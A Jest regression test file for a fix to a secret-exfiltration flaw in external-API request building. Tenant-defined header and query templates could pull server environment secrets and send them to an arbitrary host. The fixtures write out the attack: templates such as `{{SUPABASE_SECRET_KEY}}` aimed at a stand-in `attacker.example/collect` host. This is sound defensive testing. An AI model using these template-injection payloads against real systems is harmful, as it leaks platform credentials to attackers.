/**
 * SEC91-B2 — external-API catalog env-name exfiltration.
 *
 * THE DEFECT: request building resolved `process.env[name]` for ANY name — the source's
 * `api_key_env_name` and every upper-case `{{ENV_NAME}}` header / query template — and sent
 * the value to the source's `base_url`. A tenant admin could put
 * `X-Leak: {{SUPABASE_SECRET_KEY}}` (or point a company-installed preset at their own host)
 * and receive platform secrets from a scheduled run, or from a Super Admin pressing "test".
 * A tenant could also edit an approved (whitelisted) row's base_url / env names / templates
 * and keep the approval. The ad-hoc test route checked `api_key_env_name` but not templates.
 *
 * NOW: envResolutionPolicy.ts — a name resolves only if it is not a platform
 * infrastructure secret, is declared (canonical descriptors, code presets, the row's own
 * key, the provider account's ref, or explicitly approved by the ad-hoc gate), and goes to
 * an approved destination (platform row; tenant row approved by Super Admin; or the origin
 * of the code preset that declares that key). A tenant edit of base_url / auth / env names
 * / headers / query_params revokes is_whitelisted.
 *
 * All values are fake fixtures.
 */
import { buildExternalApiRequest } from '../../services/externalApi/execution';

const mockSelect = jest.fn();
jest.mock('../../db/writeOwner', () => ({
  ownedDbTable: () => ({ select: (...a: unknown[]) => mockSelect(...a) }),
}));

const SECRET_VALUES: Record<string, string> = {
  SUPABASE_SECRET_KEY: 'FAKE-supabase-secret-sec91b2',
  ENCRYPTION_KEY: 'FAKE-encryption-key-sec91b2',
  AUTH_SECRET: 'FAKE-auth-secret-sec91b2',
  ZZ_UNDECLARED_SERVER_VAR: 'FAKE-undeclared-sec91b2',
  YOUTUBE_API_KEY: 'FAKE-youtube-key-sec91b2',
  NEWS_API_KEY: 'FAKE-news-key-sec91b2',
  ZZ_PLATFORM_ROW_KEY: 'FAKE-platform-row-key-sec91b2',
};
const saved: Record<string, string | undefined> = {};
beforeAll(() => { for (const k of Object.keys(SECRET_VALUES)) saved[k] = process.env[k]; });
beforeEach(() => {
  for (const [k, v] of Object.entries(SECRET_VALUES)) process.env[k] = v;
  mockSelect.mockReset();
  mockSelect.mockResolvedValue({ data: [], error: null });
});
afterAll(() => {
  for (const k of Object.keys(SECRET_VALUES)) {
    if (saved[k] === undefined) delete process.env[k]; else process.env[k] = saved[k];
  }
});

const ATTACKER = 'https://attacker.example/collect';
const INFRA = ['SUPABASE_SECRET_KEY', 'ENCRYPTION_KEY', 'AUTH_SECRET'];
const leaks = (details: unknown, names: string[]) => {
  const s = JSON.stringify(details);
  return names.filter((n) => s.includes(SECRET_VALUES[n]));
};

const tenantRow = (over: Record<string, unknown> = {}) => ({
  id: 'src-tenant', name: 'Tenant API', base_url: ATTACKER, method: 'GET', auth_type: 'none',
  category: 'others', is_whitelisted: true, company_id: 'company-a',
  api_key_env_name: null, api_key_name: null, headers: {}, query_params: {}, ...over,
}) as any;
const platformRow = (over: Record<string, unknown> = {}) => tenantRow({ id: 'src-platform', company_id: null, is_whitelisted: true, ...over });

describe('tenant rows cannot pull server secrets into their request', () => {
  it('CRITICAL: {{INFRA_SECRET}} header/query templates on an APPROVED tenant row are not substituted', () => {
    const { details, missingEnv } = buildExternalApiRequest(tenantRow({
      headers: { 'X-Leak': '{{SUPABASE_SECRET_KEY}}', 'X-Leak-2': 'k={{ENCRYPTION_KEY}}' },
      query_params: { a: '{{AUTH_SECRET}}', b: '{{ZZ_UNDECLARED_SERVER_VAR}}' },
    }));
    expect(leaks(details, [...INFRA, 'ZZ_UNDECLARED_SERVER_VAR'])).toEqual([]);
    expect(missingEnv).toEqual(expect.arrayContaining(['SUPABASE_SECRET_KEY', 'ENCRYPTION_KEY', 'AUTH_SECRET', 'ZZ_UNDECLARED_SERVER_VAR']));
  });

  it('CRITICAL: api_key_env_name naming an infrastructure secret is not injected as the credential', () => {
    const { details } = buildExternalApiRequest(tenantRow({ auth_type: 'bearer', api_key_env_name: 'SUPABASE_SECRET_KEY' }));
    expect(leaks(details, INFRA)).toEqual([]);
    const { details: q } = buildExternalApiRequest(tenantRow({ auth_type: 'query', api_key_env_name: 'ENCRYPTION_KEY' }));
    expect(leaks(q, INFRA)).toEqual([]);
  });

  it('CRITICAL: a company-installed preset re-pointed at another host does not receive the provider key', () => {
    // Company preset rows are executable without whitelisting (category is not 'others').
    const { details } = buildExternalApiRequest(tenantRow({
      category: 'YouTube trends', is_whitelisted: null, auth_type: 'api_key', api_key_env_name: 'YOUTUBE_API_KEY',
      query_params: { key: '{{YOUTUBE_API_KEY}}', q: '{{category}}' },
    }), { runtimeValues: { category: 'x' } });
    expect(leaks(details, ['YOUTUBE_API_KEY'])).toEqual([]);
  });

  it('an UNAPPROVED tenant row gets no declared provider key towards a foreign host either', () => {
    const { details } = buildExternalApiRequest(tenantRow({ is_whitelisted: false, headers: { k: '{{NEWS_API_KEY}}' } }));
    expect(leaks(details, ['NEWS_API_KEY'])).toEqual([]);
  });

  it('LEGITIMATE: a company-installed preset at its own provider origin still resolves its key', () => {
    const { details, missingEnv } = buildExternalApiRequest(tenantRow({
      base_url: 'https://www.googleapis.com/youtube/v3/search', category: 'YouTube trends', is_whitelisted: null,
      auth_type: 'api_key', api_key_env_name: 'YOUTUBE_API_KEY', query_params: { key: '{{YOUTUBE_API_KEY}}' },
    }));
    expect(String(details.url)).toContain(SECRET_VALUES.YOUTUBE_API_KEY);
    expect(missingEnv).toEqual([]);
  });
});

describe('platform rows', () => {
  it('LEGITIMATE: a platform row resolves its own registered key (compat)', () => {
    const { details } = buildExternalApiRequest(platformRow({ auth_type: 'bearer', api_key_env_name: 'ZZ_PLATFORM_ROW_KEY', base_url: 'https://api.provider.example/v1' }));
    expect(String(details.headers.Authorization)).toContain(SECRET_VALUES.ZZ_PLATFORM_ROW_KEY);
  });

  it('LEGITIMATE: a platform row template naming its own key or a declared preset key resolves', () => {
    const { details } = buildExternalApiRequest(platformRow({
      base_url: 'https://newsapi.org/v2/everything', api_key_env_name: 'NEWS_API_KEY', query_params: { apiKey: '{{NEWS_API_KEY}}' },
    }));
    expect(String(details.url)).toContain(SECRET_VALUES.NEWS_API_KEY);
  });

  it('even a platform row can never resolve an infrastructure secret or an undeclared variable', () => {
    const { details } = buildExternalApiRequest(platformRow({
      auth_type: 'bearer', api_key_env_name: 'SUPABASE_SECRET_KEY',
      headers: { x: '{{ENCRYPTION_KEY}}', y: '{{ZZ_UNDECLARED_SERVER_VAR}}' },
    }));
    expect(leaks(details, [...INFRA, 'ZZ_UNDECLARED_SERVER_VAR'])).toEqual([]);
  });

  it('the ad-hoc test gate approves only the name it checked — other templates stay unresolved', () => {
    const { details } = buildExternalApiRequest(
      platformRow({ auth_type: 'bearer', api_key_env_name: 'ZZ_PLATFORM_ROW_KEY', headers: { x: '{{ZZ_UNDECLARED_SERVER_VAR}}' } }),
      { approvedEnvNames: ['ZZ_PLATFORM_ROW_KEY'] },
    );
    expect(leaks(details, ['ZZ_UNDECLARED_SERVER_VAR'])).toEqual([]);
  });
});

describe('registries and helpers', () => {
  // eslint-disable-next-line @typescript-eslint/no-var-requires
  const allow = () => require('../../services/externalApi/testEnvAllowlist');

  it('an infrastructure secret is never testable, even when registered on a source row', async () => {
    mockSelect.mockResolvedValue({ data: [{ api_key_env_name: 'SUPABASE_SECRET_KEY', company_id: null }], error: null });
    expect((await allow().assertTestableEnvVarName('SUPABASE_SECRET_KEY')).allowed).toBe(false);
  });

  it('a name registered only on a TENANT row does not become testable', async () => {
    mockSelect.mockResolvedValue({ data: [{ api_key_env_name: 'ZZ_UNDECLARED_SERVER_VAR', company_id: 'company-a' }], error: null });
    expect((await allow().assertTestableEnvVarName('ZZ_UNDECLARED_SERVER_VAR')).allowed).toBe(false);
  });

  it('a name registered on a PLATFORM row stays testable (compat)', async () => {
    mockSelect.mockResolvedValue({ data: [{ api_key_env_name: 'ZZ_PLATFORM_ROW_KEY', company_id: null }], error: null });
    expect((await allow().assertTestableEnvVarName('ZZ_PLATFORM_ROW_KEY')).allowed).toBe(true);
  });

  it('generic resolveEnvValue helpers refuse infrastructure secrets', () => {
    // eslint-disable-next-line @typescript-eslint/no-var-requires
    const a = require('../../services/externalApi/internalHelpers').resolveEnvValue;
    // eslint-disable-next-line @typescript-eslint/no-var-requires
    const b = require('../../services/externalApi/requestValidation').resolveEnvValue;
    for (const n of INFRA) { expect(a(n)).toBeUndefined(); expect(b(n)).toBeUndefined(); }
    expect(a('ZZ_PLATFORM_ROW_KEY')).toBe(SECRET_VALUES.ZZ_PLATFORM_ROW_KEY);
  });

  it('a provider-account env reference cannot name an infrastructure secret', () => {
    // eslint-disable-next-line @typescript-eslint/no-var-requires
    const { resolveAccountCredentials } = require('../../services/providerAccountService');
    const r = resolveAccountCredentials({ id: 'acct-1', credentials_encrypted: JSON.stringify({ api_key_env_name: 'SUPABASE_SECRET_KEY' }) });
    expect(r.api_key_value).toBeNull();
  });
});
